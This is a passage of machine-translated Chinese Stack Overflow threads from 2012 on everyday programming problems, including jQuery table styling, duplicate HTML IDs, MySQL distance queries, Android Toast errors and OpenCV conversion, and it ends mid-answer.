                $(this).css('width', '7%');
            }
            if (i % numberOfColumns == 10) {
                $(this).css('width', '8%');
                $(this).css('background-color', 'orange');
            }

            if (i % numberOfColumns == 11) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 12) {
                $(this).css('width', '5%');
            }

            if (i % numberOfColumns == 13) {
                $(this).css('width', '30%');
                $(this).css('background-color', 'Yellow');
            }

            if (i % numberOfColumns == 14) {
                $(this).css('width', '7%');
            }

            if (i % numberOfColumns == 15) {
                $(this).css('width', '7%');
            }

        }
        );

        //Hide Is Summary Row Column
        var selectedElements = $("tr").find("th:first, td:first");
        $(selectedElements).hide();

    }
    );
</script>
</head>

<body>

<form method="post" action="LocalTaxReport.aspx" id="form1">
<div id="wrapper">
    <div id="container">
        <div id="centralContainer">
            <div id="mainContainer">
                <div id="contentHolderDiv" class="contentHolderDiv">
                    <div id="resultContainer" class="resultContainerDiv">
                        <div id="gridDiv" class="gridTableBorder">
                            <div>
                                <table class="resultGridTable" cellspacing="1" id="detailContentPlaceholder_grdLocalTaxReport" style="border-collapse: collapse;">
                                    <tr>
                                        <th scope="col">
                                            IsSummaryRow
                                        </th>
                                        <th scope="col">
                                            Associate
                                        </th>
                                        <th scope="col">
                                            My Amount
                                        </th>
                                        <th scope="col">
                                            Federal Withholding
                                        </th>
                                        <th scope="col">
                                            Social Security
                                        </th>
                                        <th scope="col">
                                            Medicaring
                                        </th>
                                        <th scope="col">
                                            State Tax
                                        </th>
                                        <th scope="col">
                                            County Tax
                                        </th>
                                        <th scope="col">
                                            City Tax
                                        </th>
                                        <th scope="col">
                                            Total
                                        </th>
                                        <th scope="col">
                                            State
                                        </th>
                                        <th scope="col">
                                            State Code
                                        </th>
                                        <th scope="col">
                                            County
                                        </th>
                                        <th scope="col">
                                            County Code
                                        </th>
                                        <th scope="col">
                                            City
                                        </th>
                                        <th scope="col">
                                            City Code
                                        </th>
                                    </tr>
                                    <tr>
                                        <td>
                                            False
                                        </td>
                                        <td>
                                            Mary Dryden
                                        </td>
                                        <td>
                                            $3450
                                        </td>
                                        <td>
                                            $32
                                        </td>
                                        <td>
                                            $5
                                        </td>
                                        <td>
                                            $2
                                        </td>
                                        <td>
                                            $10
                                        </td>
                                        <td>
                                            $1
                                        </td>
                                        <td>
                                            $2
                                        </td>
                                        <td>
                                            $3400
                                        </td>
                                        <td>
                                            Arkansas
                                        </td>
                                        <td>
                                            AR
                                        </td>
                                        <td>
                                            Benton
                                        </td>
                                        <td>
                                            04567
                                        </td>
                                        <td>
                                            Bentonville
                                        </td>
                                        <td>
                                            23156
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="clear">
                    </div>
                </div>
            </div>
            <div class="clear">
            </div>
        </div>
    </div>
</div>
</form>

</body>
</html> 
```

我刚刚解决了你的问题，我对你的代码和 css 做了一些研发。我刚刚删除了 table-layout:fixed 和 word-wrap:break-word;

这在 IE8 和 IE7 中都存在问题。在屏幕截图 2 中，由于 word-wrap:break-word 导致单元格高度增加。

在其他浏览器中它工作正常。只需复制代码并在浏览器中检查即可。如果您的需求在不使用 table-layout:fixed 和 word-wrap css 属性的情况下得到满足，那么这就是您的解决方案。

@Lijo 如果我遗漏了什么，请告诉我。

# javascript - 使用相同的 HTML ID 多次调用 Javascript 函数

> ID：13599660
> 
> 赞同：-4
> 
> 时间：2012-11-28T07:09:29.017
> 
> 标签：javascript

我多次调用`onclick`函数时遇到问题。问题是我使用的是相同的 ID，但我希望能够在第二次调用中再次重用该函数。这是我到目前为止所拥有的：

```
<p onclick='myfunction()'> Click this text for input box  below </p>
<b id='myThing'>input box appears .. ta daa</b>
<p onclick='myfunction()'> Click this new text for input box below </p>
<div id='myThing'> but no input box appears here, the line above must turn this text into a  textbox, but it doesn't because of similar id, how do i fix the id problem without defining a new id over and over?</div>
<script>
  function myfunction(){
    document.getElementById("myThing").innerHTML='<input type="text"/>';
  }
</script> 
```

有没有办法将 ID 转换为 Javascript 变量？如何使零件创建输入框？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:15:11.053

在这种情况下，您不需要使用 ID 来获取 div。

```
function myfunction(){
 this.nextSibling.innerHTML='<input type="text"/>';
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:11:51.223

你可以这样做：

```
<p onclick='myfunction("myThing")'> Click this new text for input box below </p>
<script>
function myfunction(id){
 document.getElementById(id).innerHTML='<input type="text"/>';
 }
 </script> 
```

[示范](http://jsfiddle.net/cEJsW/)

请注意，您还可以使整个事情变得更简单：根本不使用任何 id 而是让函数找到下一个元素：

```
<p onclick='myfunction(this)'> Click this text for input box  below </p>
<b>input box appears .. ta daa</b>
<p onclick='myfunction(this)'> Click this new text for input box below </p>
<div> but no input box appears here, the line above must turn this text into a  textbox, but it doesn't because of similar id, how do i fix the id problem without defining a new id over and over?</div>

​&lt;script>
function myfunction(element){
    do {
        element = element.nextSibling;
    } while (element && element.nodeType != 1);
    element.innerHTML='<input type="text"/>';
 }
</script>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

[示范](http://jsfiddle.net/nCuFz/)

# broadcast - lwip 支持多播或广播

> ID：13599661
> 
> 赞同：1
> 
> 时间：2012-11-28T07:09:30.563
> 
> 标签：broadcast, multicast, lwip

在 LWIP 中，确认它支持多播或广播，但如果数据或数据包是由发送方使用广播发送的，会发生什么？ACK有什么机制吗？是这样的话，那么在发送方就会出现内爆问题。请帮助我找到问题，即它遵循 ACK 以确保可靠性或没有 ACK 机制和可靠性。该协议将如何进行拥塞控制？

# ios - 如何在 iOS 通话期间检查音频是否路由到蓝牙免提？

> ID：13599662
> 
> 赞同：2
> 
> 时间：2012-11-28T07:09:33.967
> 
> 标签：ios, bluetooth

当有来自 iOS 设备的任何传入/传出呼叫时，我想检测以下事件：

1.  是否连接了任何蓝牙耳机设备。
2.  音频是否路由到任何蓝牙耳机设备。

我是蓝牙配件编程的新手，有什么办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:14:22.287

在下面的代码中，检查“micConnected”的值以查看耳机是否已连接。

```
AudioSessionInitialize(NULL, NULL, NULL, NULL);    
UInt32 propertySize, micConnected;
    AudioSessionGetProperty(kAudioSessionProperty_AudioInputAvailable, &propertySize, &micConnected); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-10T05:44:50.397

我解决了它，如下所示：

```
AVAudioSession *audioSession = [AVAudioSession sharedInstance];
    NSError *err;

    // close down our current session...
    [audioSession setActive:NO error:nil];
    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange,   &AudioSessionManager_audioRouteChangedListener, self);

    void AudioSessionManager_audioRouteChangedListener (void *inClientData, AudioSessionPropertyID inID, UInt32 inDataSize, const void *inData)
    {
        NSLog(@"AudioSessionManager_audioRouteChangedListener");
        MyAppDelegate *instance = (MyAppDelegate *)inClientData;
        CFDictionaryRef routeChangeDictionary = inData;

        // extract the route change reason...

        CFNumberRef routeChangeReasonRef = CFDictionaryGetValue (routeChangeDictionary, CFSTR(kAudioSession_AudioRouteChangeKey_Reason));
        SInt32 routeChangeReason = kAudioSessionRouteChangeReason_Unknown;
        if (routeChangeReasonRef)
            CFNumberGetValue (routeChangeReasonRef, kCFNumberSInt32Type, &routeChangeReason);

        // extract the old route..

        CFStringRef newRoute;
        if ([[[UIDevice currentDevice] systemVersion] doubleValue] >= 5.0)
        {
            newRoute = CFDictionaryGetValue(routeChangeDictionary, @"OutputDeviceDidChange_NewRoute");
        }
        else
        {
            newRoute = CFDictionaryGetValue(routeChangeDictionary, @"OutputDeviceDidChange_NewRoute");
        }

        CFStringRef oldRoute;
        oldRoute = CFDictionaryGetValue(routeChangeDictionary, @"OutputDeviceDidChange_OldRoute");
        NSLog(@"newRouteString:%@ oldRoute:%@",newRoute,oldRoute);

        [instance onAudioRouteChangedWithReason:routeChangeReason newRoute:(NSString *)newRoute oldRoute:(NSString *)oldRoute];
    } 
```

# database - 使用 VB.net 在数据库中简单插入 Microsoft Access 2003 失败

> ID：13599669
> 
> 赞同：0
> 
> 时间：2012-11-28T07:10:03.700
> 
> 标签：database, vb.net, ms-access, sql-update

我正在尝试从 VB.net 插入 Microsoft Access 数据库。我可以从数据库中读取（可以在网格视图中查看）但无法插入数据库。我不知道问题出在哪里。这就是我正在做的事情：

```
Imports System.Data
Imports System.Data.OleDb

Public Class Form1
Public ctr As Integer
Dim bm As BindingManagerBase
Dim dr As DataRow, dt As DataTable
Dim flag As Integer, tid As Integer, tname As String
Dim totalrow As Integer, currentrow As Integer

Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    'TODO: This line of code loads data into the 'ShowroomDataSet.customer' table. You can move, or remove it, as needed.
    bm = Me.BindingContext(ShowroomDataSet, "customer")
    bm.Position = 0
    Me.CustomerTableAdapter.Fill(Me.ShowroomDataSet.customer)

 End Sub

Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
    Dim x As Integer
    Dim y As String
    bm.Position = bm.Count - 1
    x = ShowroomDataSet.customer(bm.Position).cid
    y = ShowroomDataSet.customer(bm.Position).cname
    TextBox1.Text = x
    TextBox2.Text = y

  End Sub

Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
    Close()
End Sub

Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
    'save
    'enable all buttons except save
    If flag = 1 Then
        dt = ShowroomDataSet.Tables("customer")
        dr = dt.NewRow()
        dr!cid = Val(TextBox1.Text)
        dr!cname = TextBox2.Text
        dt.Rows.Add(dr)

    End If
    If flag = 2 Then
        dr.Delete()
    End If
    If flag = 3 Then
        dt = ShowroomDataSet.Tables("customer")
        dr = dt.Rows.Find(tid)
        dr.BeginEdit()
        dr!cid = Val(TextBox1.Text)
        dr!name = TextBox2.Text
        dr.EndEdit()
    End If
    'Me.CustomerTableAdapter.Update(Me.ShowroomDataSet.customer)
    'Me.CustomerTableAdapter.Fill(Me.ShowroomDataSet.customer)
    flag = 0
    Button1.Enabled = True
    Button2.Enabled = False
    Button3.Enabled = True
    Button4.Enabled = True

End Sub

Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
    'add
    'disable all buttons except save
    Dim len As Integer
    TextBox1.Text = " "
    TextBox2.Text = " "
    flag = 1
    TextBox1.Focus()
    Button1.Enabled = False
    Button2.Enabled = True
    Button3.Enabled = False
    Button4.Enabled = False
    dt = ShowroomDataSet.Tables("customer")
    len = dt.Rows.Count - 1
    dr = dt.Rows(len)
  End Sub
  End Class 
```

没有错误或故障。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:52:21.813

如果您只是想将数据插入到 access 数据库中，请使用数据库表适配器插入方法，然后使用表适配器的填充方法来填充数据集中的表。请参阅以下示例

me.tableadapter.insert(me.1stFieldTextbox.text, me.2ndFieldTextBox.Text....) me.tableadapter.fill(me.Dataset.Table)

如果您收到错误，可能是因为您的数据类型不匹配，您尝试将数据插入自动增量字段或具有计算数据类型的字段。

# mysql - 如何在一次计算中选择和过滤公式

> ID：13599673
> 
> 赞同：0
> 
> 时间：2012-11-28T07:10:14.623
> 
> 标签：mysql, select, where

有没有办法让一个公式在 select 和 where 条件中只计算一次？

我假设 mysql 必须对每一行进行两次计算，如下例所示。

```
SELECT z1.id sid1,z2.id sid2,SQRT(POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2)) r
    FROM stars z1,stars z2
    WHERE z1.id!=z2.id
    AND SQRT(POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2)) <=32
    ORDER BY z1.id,z2.id 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:17:33.633

您不能在子句中引用在`SELECT`子句中定义的别名`WHERE`，但可以在`HAVING`子句中使用它们。这是因为`WHERE`之前评估过`SELECT`可能`SELECT`包含聚合函数。

```
SELECT z1.id sid1,z2.id sid2,SQRT(POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2)) r
 FROM stars z1,stars z2
 WHERE z1.id != z2.id
 HAVING r <= 32
 ORDER BY z1.id,z2.id 
```

但请注意，该`HAVING`子句很可能不会在索引中使用。您可以为该`WHERE`子句提供一个近似术语以用于索引目的：

```
SELECT z1.id sid1,z2.id sid2,SQRT(POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2)) r
 FROM stars z1,stars z2
 WHERE z1.id != z2.id
 AND (z2.col BETWEEN z1.col-32 AND z1.col+32)
 AND (z2.row BETWEEN z1.row-32 AND z1.row+32)
 HAVING r <= 32
 ORDER BY z1.id,z2.id 
```

请注意，瓶颈是磁盘访问，而不是算术计算，因此如果您正在优化速度，您可能希望保留 WHERE 并仅优化 WHERE 子句：

注意

*   x^2 与 abs(x)^2 相同。
*   x*x 可能比 pow(x,2) 快
*   您可以将另一边平方而不是计算 sqrt。

尝试：

```
SELECT z1.id sid1,z2.id sid2,
  SQRT((z1.col-z2.col)*(z1.col-z2.col) + (z1.row-z2.row)*(z1.row-z2.row)) r
 FROM stars z1,stars z2
 WHERE z1.id != z2.id
 AND (z1.col-z2.col)*(z1.col-z2.col) + (z1.row-z2.row)*(z1.row-z2.row) <= 1024
 ORDER BY z1.id,z2.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:40:57.707

请注意，您实际上不需要计算此表达式

```
SQRT(POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2)) <=32 
```

首先，您可以通过将表达式的两个部分都提高到 2 次方来避免计算 SQRT，这通常是缓慢且不是绝对准确的。之后它变为相等，但更准确和更快

```
POW(ABS(z1.col-z2.col),2) + POW(ABS(z1.row-z2.row),2) <= 1024 
```

其次，您将 ABS(z1.col-z2.col) 提高到 2 次方，但这里不需要 ABS，因为它不会真正影响 POW 的结果。

```
z1.col = 4, z2.col = 2   => pow(4-2, 2) = pow(2,2) = 2*2 = 4
z1.col = 2, z2.col = 4   => pow(2-4, 2) = pow(-2,2) = -2*-2 = 4 
```

所以，

```
POW(z1.col-z2.col,2) + POW(z1.row-z2.row,2) <= 1024 
```

将使查询更快。

# android - 一个活动中的两个列表视图

> ID：13599675
> 
> 赞同：2
> 
> 时间：2012-11-28T07:10:21.920
> 
> 标签：android, listview, scroll

我有两个列表视图。

我遇到的问题是屏幕滚动直到较小（高度）列表视图到达底部。
如何展开包含视图以便滚动到更长的 listView 的底部？

我重载了 onScroll 以同时滚动两个列表。

```
 public void onScroll(AbsListView view, int firstVisibleItem,
        int visibleItemCount, int totalItemCount) {

        super.onScroll(view, firstVisibleItem, visibleItemCount, totalItemCount);
        if (view.getChildAt(0) != null) {
            if (view.equals(m_lv1) ){
                m_lv2.setSelectionFromTop(view.getFirstVisiblePosition(),
                    view.getChildAt(0).getTop());
            } else if (view.equals(m_lv2) ){
                m_lv1.setSelectionFromTop(view.getFirstVisiblePosition(),
                    view.getChildAt(0).getTop());
            }
        }
    }

<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="match_parent"  
    android:layout_height="match_parent">

  <ListView
      android:id="@+id/list_view_left"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:scrollbars="none"  
      android:layout_weight="1" >
  </ListView>

  <ListView
      android:id="@+id/list_view_right"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:layout_weight="1" >
  </ListView>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:13:52.337

你必须设置列表视图的高度......就像。

```
<ListView
      android:id="@+id/list_view_left"
      android:layout_width="fill_parent"
      android:layout_height="120dp"
      android:scrollbars="none"  
      android:layout_weight="1" >
  </ListView>

  <ListView
      android:id="@+id/list_view_right"
      android:layout_width="fill_parent"
      android:layout_height="120dp"
      android:layout_weight="1" >
  </ListView> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:22:13.557

使用下面的 XML 代码而不是您的代码。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"  
    android:layout_height="fill_parent">

  <ListView
      android:id="@+id/list_view_left"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:layout_weight="1" >
  </ListView>

  <ListView
      android:id="@+id/list_view_right"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:layout_weight="1" >
  </ListView>
</LinearLayout> 
```

# listview - jquery mobile：如何将标题保留在嵌套列表的标题中

> ID：13599676
> 
> 赞同：0
> 
> 时间：2012-11-28T07:10:20.910
> 
> 标签：listview, jquery-mobile, header

在我的小应用程序中，我有一个使用 jQuery mobile 的嵌套列表。如果单击列表中的某个项目，标题中的标题会更改并显示我单击的项目的标题。我怎样才能实现，标题保持在之前的页面上？

例子：

```
 <div data-role="page" id="newspage" data-theme="a">

        <div data-role="header" data-position="fixed">
            <a href="#home" data-role="button" data-icon="home" data-iconpos="notext" data-mini="true" data-inline="true" data-transition="slide" data-direction="reverse">Home</a>
            <h1>News</h1>
        </div>

        <div data-role="content" id="newsList">
            <ul data-role="listview">
                <li>
                    <h2>News 1</h2>
                    <p>This is a short version of news 1</p>
                    <ul>
                        <li>
                            <h2>News 1</h2>
                            <p>This is the text of news 1</p>
                        </li>
                    </ul>
                </li>
                <li>
                    <h2>News 2</h2>
                    <p>This is a short version of news 2</p>
                    <ul>
                        <li>
                            <h2>News 2</h2>
                            <p>This is the text of news 2</p>
                        </li>
                    </ul>
                </li>
            </ul>
        </div>
    </div> 
```

因此，如果我单击“新闻 1”，标题中的标题会更改为“新闻 1”，并且当然会显示嵌套项目。但我想在嵌套项目的标题中包含“新闻”，就像之前在标题 div 中定义的那样。我希望我清楚我想要什么。:-) 知道怎么做吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T10:45:46.680

[这](http://jsfiddle.net/Gajotres/fBL8p/)是你的解决方案。您将在 HTML 的末尾找到您的解决方案。

代码示例：

```
 $(':jqmData(url^=newspage)').live('pagebeforecreate',function (event) {
      var title =  $(':jqmData(url^=newspage)').find(':jqmData(role=header) h1').html();
      $(this).filter(':jqmData(url*=ui-page)').find(':jqmData(role=header)').html('<h1>' + title + '</h1>');
 }); 
```

看这部分代码：

```
$(':jqmData(url^=newspage)'). 
```

newspage 是您的 listview 容器页面的 id。

# matlab - 通过线性索引添加

> ID：13599688
> 
> 赞同：3
> 
> 时间：2012-11-28T07:10:52.003
> 
> 标签：matlab, indexing, octave, addition

我有一个 256 x 256 矩阵 M，并产生了一些线性索引 L。

我还有一个权重向量，与 L 相同，要添加到由 L 索引的 M 的元素中。问题是，用表达式

```
M(L) = M(L) + weights; 
```

对于 L 中的重复值，只会添加 weights 中最后一个对应的元素。

有没有一种简单的方法来解决这个问题/我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T08:48:29.213

我认为这里的方法是使用 accumarray：

```
% The 'data'
M = zeros(10,5); % Suppose this is your matrix
L = [46 47 47 46 48 49 48 48 48]'; % The linear index numbers
weights = [4 7 4 6 4 9 48 8 48]'; % The weights for these index numbers

% Make sure the indices are in ascending order
Y = SORTROWS([L weights]);

% Determining the weights to be added
idx = unique(Y(:,1));
weights_unique = accumarray(Y(:,1),Y(:,2));

% The addition
M(idx) = M(idx) + weights_unique(weights_unique>0); 
```

# grails - 在闪存中存储消息会产生编码问题

> ID：13599689
> 
> 赞同：0
> 
> 时间：2012-11-28T07:10:54.877
> 
> 标签：grails

`flash.message = "Message"`用于设置错误消息时，我遇到了一些编码问题。稍后在视图中打印出来时，就像它是 ISO8859-1 而不是 UTF。

这是我的代码：

```
try {
            assert xml.results.result.size() == 1
        }
        catch(AssertionError e) {
            flash.message = "Fel, hittade mer än ett resultat. Detta ska inte hända, var god och radera en xxx för detta xxx"
            println "Error, found more than one result. This should not occur, please remove one of the result for this id."
            println e.getMessage()
        } 
```

这是一个标准的 grails 应用程序，我所做的只是将 generate-all 用于域控制器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T14:01:39.320

确保您的文件（在您的 IDE 中）使用与 Grails 属性相同的编码进行编码：

```
grails.views.gsp.encoding 
```

默认情况下应为 UTF-8。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T18:04:59.343

尝试使用：

```
render(view: "view", ..., encoding: "UTF-8") 
```

# websphere-7 - 何时以及为何同时拥有一个 HTTP 服务器和 websphere 应用程序服务器？

> ID：13599690
> 
> 赞同：0
> 
> 时间：2012-11-28T07:11:01.443
> 
> 标签：websphere-7, ibmhttpserver

用户可以通过 HTTP URL 和该特定应用程序的上下文根访问部署在 Websphere 应用程序服务器上的应用程序。那么人们何时以及为什么在用户和 Websphere 应用服务器之间使用 Apache / IBM HTTP 服务器？

如果在用户和 Websphere 应用程序服务器之间使用 HTTP 服务器，那么 URL 重定向是如何发生的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T21:54:16.627

使用 IBM HTTP Server 的好处主要是性能和安全性。 [这个 developerWorks 答案](http://www.ibm.com/developerworks/forums/thread.jspa?messageID=14260968)是我在回答相同问题时看到的最好的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-31T21:26:44.043

概括：

1.  IBM HTTP Server (IHS) 插件管理对 WAS 定义的上下文的访问
2.  IHS 插件可以管理 WAS 服务器上的负载平衡
3.  IHS 管理更好的 HTTP 流量
4.  IHS 可以处理从 WAS 中提取负载的静态内容
5.  IHS 可以处理 RewriteRules、VirtualHosts、Authentication 等等！

# android - 如何从 EditText 获取字符？

> ID：13599694
> 
> 赞同：2
> 
> 时间：2012-11-28T07:11:10.850
> 
> 标签：android, string, character, android-edittext, forceclose

我想从 EditText 中获取字符串，然后从中读取单个字符。我试过以下代码：

```
String PT = pt.getText().toString(); 
int len = PT.length(); 
char chars[] = PT.toCharArray(); 
for(int i=0;i<len;i++)
{ Toast.makeText(encrypt.this,chars[i], 0).show(); } 
```

但是我收到了强制关闭错误。我哪里错了？

我对这一切都很陌生！

这是 LogCat：

```
11-28 12:41:01.228: E/AndroidRuntime(1632):     at android.app.ActivityThread.main(ActivityThread.java:3683)
11-28 12:41:01.228: E/AndroidRuntime(1632):     at java.lang.reflect.Method.invokeNative(Native Method)
11-28 12:41:01.228: E/AndroidRuntime(1632):     at java.lang.reflect.Method.invoke(Method.java:507)
11-28 12:41:01.228: E/AndroidRuntime(1632):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
11-28 12:41:01.228: E/AndroidRuntime(1632):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
11-28 12:41:01.228: E/AndroidRuntime(1632):     at dalvik.system.NativeStart.main(Native Method)
11-28 12:46:43.688: W/KeyCharacterMap(1674): No keyboard for id 0
11-28 12:46:43.688: W/KeyCharacterMap(1674): Using default keymap: /system/usr/keychars/qwerty.kcm.bin
11-28 12:46:54.442: W/ResourceType(1674): No package identifier when getting value for resource number 0x00000061
11-28 12:46:54.448: D/AndroidRuntime(1674): Shutting down VM
11-28 12:46:54.448: W/dalvikvm(1674): threadid=1: thread exiting with uncaught exception (group=0x40015560)
11-28 12:46:54.459: E/AndroidRuntime(1674): FATAL EXCEPTION: main
11-28 12:46:54.459: E/AndroidRuntime(1674): android.content.res.Resources$NotFoundException: String resource ID #0x61
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.content.res.Resources.getText(Resources.java:201)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.widget.Toast.makeText(Toast.java:258)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at com.project.DENCrypt.encrypt$1.onClick(encrypt.java:33)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.view.View.performClick(View.java:2485)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.view.View$PerformClick.run(View.java:9080)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.os.Handler.handleCallback(Handler.java:587)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.os.Handler.dispatchMessage(Handler.java:92)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.os.Looper.loop(Looper.java:123)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at android.app.ActivityThread.main(ActivityThread.java:3683)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at java.lang.reflect.Method.invokeNative(Native Method)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at java.lang.reflect.Method.invoke(Method.java:507)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
11-28 12:46:54.459: E/AndroidRuntime(1674):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:27:11.310

```
Toast.makeText(encrypt.this,String.valueOf(chars[i]), 0).show(); 
```

代替

```
Toast.makeText(encrypt.this,chars[i], 0).show(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-29T07:38:43.680

试试这个：

```
Toast.makeText(encrypt.this,chars[i] + "", 0).show(); 
```

它与 Ram 的方法相同

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:24:32.593

将您的吐司消息更改为

```
Toast.makeText(encrypt.this,Character.toString(chars[i]), Toast.LENGTH_SHORT).show(); 
```

这里的问题在于 Toast 消息。Toast 不能显示字符。所以将字符转换为字符串并显示

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:25:13.500

是`chars[i]`整数值。如果您仔细查看错误日志，您会看到

```
android.content.res.Resources$NotFoundException: String resource ID #0x61 
```

（如果您传递整数参数，android 将查找具有此 Id 的资源）

您可以直接从字符串中打印字符：

```
Toast.makeText(encrypt.this,PT[i], 0).show(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T07:26:00.893

从它读取数据时，编辑文本（布局资源）可能不可用。只需检查您是否能够获得任何空值

```
EditText edt1 = (EditText)findViewById(R.id.myEditView); 
```

记录 edt1（通过 log、system.out.println）；

# python - 将 OpenCV-Python 转换为 C++/Objective C

> ID：13599695
> 
> 赞同：1
> 
> 时间：2012-11-28T07:11:22.857
> 
> 标签：python, objective-c, ios, opencv

我从@abid-rahman-k 中找到了这个非常好的代码来检测图像中的矩形： [OpenCV C++/Obj-C: Advanced square detection](https://stackoverflow.com/questions/10533233/opencv-c-obj-c-advanced-square-detection) 现在代码在 Python 中，这里是：

```
import cv2
import numpy as np

img = cv2.imread('sof.jpg')
img = cv2.resize(img,(500,500))
gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)

ret,thresh = cv2.threshold(gray,127,255,0)
contours,hier = cv2.findContours(thresh,cv2.RETR_LIST,cv2.CHAIN_APPROX_SIMPLE)

for cnt in contours:
    if cv2.contourArea(cnt)>5000:  # remove small areas like noise etc
        hull = cv2.convexHull(cnt)    # find the convex hull of contour
        hull = cv2.approxPolyDP(hull,0.1*cv2.arcLength(hull,True),True)
        if len(hull)==4:
            cv2.drawContours(img,[hull],0,(0,255,0),2)

cv2.imshow('img',img)
cv2.waitKey(0)
cv2.destroyAllWindows() 
```

我想把它转换成Objective C/C++。这就是我所做的，但没有奏效，我错过了什么？

```
- (void)processImage2:(cv::Mat&)image;
{
    cv::Mat img,gray,thresh;

    std::vector<std::vector<cv::Point> > contours;

    //  cv::resize(image.clone(), image, cv::Size(500,500) );

    cvtColor(image,  gray, cv::COLOR_BGR2GRAY );

    cv::threshold(gray, thresh, 127, 255, 0);
    findContours(thresh, contours, CV_RETR_LIST, CV_CHAIN_APPROX_SIMPLE);

    std::vector<cv::Point> hull;
    for (size_t i = 0; i < contours.size(); i++)
    {
        if (cv::contourArea(contours[i])>5000){
            cv::convexHull(contours[i],hull);
           approxPolyDP(hull, hull, 0.1*arcLength(hull, true), true);
            if (hull.size() ==4)
               cv::drawContours(image,hull,0,cv::Scalar(0,255,0),2);

        }
    }

} 
```

更新：

该程序运行但在我选择图像后它崩溃并出现此错误：

```
Nov 28 10:26:52 Anas-Basalamahs-MacBook-Air.local OpenCV Tutorial[18861] <Error>: CGBitmapContextCreate: unsupported parameter combination: 0 integer bits/component; 0 bits/pixel; 0-component color space; kCGImageAlphaNone; 0 bytes/row.
Nov 28 10:26:52 Anas-Basalamahs-MacBook-Air.local OpenCV Tutorial[18861] <Error>: CGContextConcatCTM: invalid context 0x0
Nov 28 10:26:52 Anas-Basalamahs-MacBook-Air.local OpenCV Tutorial[18861] <Error>: CGContextSetInterpolationQuality: invalid context 0x0
Nov 28 10:26:52 Anas-Basalamahs-MacBook-Air.local OpenCV Tutorial[18861] <Error>: CGContextDrawImage: invalid context 0x0
Nov 28 10:26:52 Anas-Basalamahs-MacBook-Air.local OpenCV Tutorial[18861] <Error>: CGBitmapContextCreateImage: invalid context 0x0
2012-11-28 10:26:52.963 OpenCV Tutorial[18861:c07] resized image size: NSSize: {0, 0}
OpenCV Error: Assertion failed (i < 0) in getMat, file /Users/bloodaxe/Develop/opencv/modules/core/src/matrix.cpp, line 957
terminate called throwing an exception(lldb) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-26T10:45:28.160

在这里，这是有效的：

```
cv::Mat oResult, oToShow;
// roMat is your input image
